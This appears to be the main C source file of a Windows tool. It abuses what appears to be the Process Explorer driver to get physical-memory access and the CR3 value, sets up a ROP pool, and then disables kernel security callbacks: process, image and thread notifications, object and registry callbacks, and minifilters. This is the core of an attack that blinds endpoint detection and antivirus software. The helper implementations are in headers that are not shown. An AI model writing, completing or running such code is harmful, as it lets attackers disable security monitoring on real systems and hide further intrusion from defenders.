#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "DriverInit.h"
#include "DisableCallBack.h"

void print_usage() {
    printf("Usage: program_name [1-6]\n");
    printf("Arguments:\n");
    printf("  1 - DisablePsProcess\n");
    printf("  2 - DisablePsImg\n");
    printf("  3 - DisablePsThread\n");
    printf("  4 - DisableObCallBack\n");
    printf("  5 - DisableCm\n");
    printf("  6 - DisableMinifilter\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        print_usage();
        return 1;
    }

    ULONG64 cr3 = NULL;
    ULONG64 phyMemHandle = NULL;
    ULONG64 allocatePool = NULL;
    SetPrivilegeA(SE_DEBUG_NAME, TRUE);

    do {
        if (!InitFunc()) {
#ifdef _DEBUG
            printf("InitFunc failed!\n");
#endif
            break;
        }

        if (!DriverInit()) {
#ifdef _DEBUG
            printf("DriverInit function failed!\n");
#endif
            DriverUninit();
            break;
        }

        if (OpenProcExp()) {
            phyMemHandle = GetPhysicalMemoryHandle();
            if (phyMemHandle) {
                cr3 = GetCr3((HANDLE)phyMemHandle);
                SetCr3(cr3);
                SetPhyMem((HANDLE)phyMemHandle);
#ifdef _DEBUG
                printf("phyMemHandle handle 0x%llX cr3 0x%llX\n", phyMemHandle, cr3);
#endif        
                allocatePool = AllocateRopPool();
            }
            else {
#ifdef _DEBUG
                printf("phyMemHandle get failed!\n");
#endif
            }
            CloseProcExp();
        }
        else {
#ifdef _DEBUG
            printf("OpenProcExp failed!\n");
#endif
        }

        DriverUninit();

        if (!phyMemHandle)
            break;

        if (!RopInit(allocatePool))
            break;

#ifdef _DEBUG
        printf("Init successfully begin to disable callback!\n");
#endif

        for (int i = 1; i < argc; i++) {
            int option = atoi(argv[i]);
            switch (option) {
            case 1:
                DisablePsProcess();
                break;
            case 2:
                DisablePsImg();
                break;
            case 3:
                DisablePsThread();
                break;
            case 4:
                DisableObCallBack();
                break;
            case 5:
                DisableCm();
                break;
            case 6:
                DisableMinifilter();
                break;
            default:
                printf("Invalid argument: %d\n", option);
                print_usage();
                return 1;
            }
        }
    } while (false);

    return 0;
}
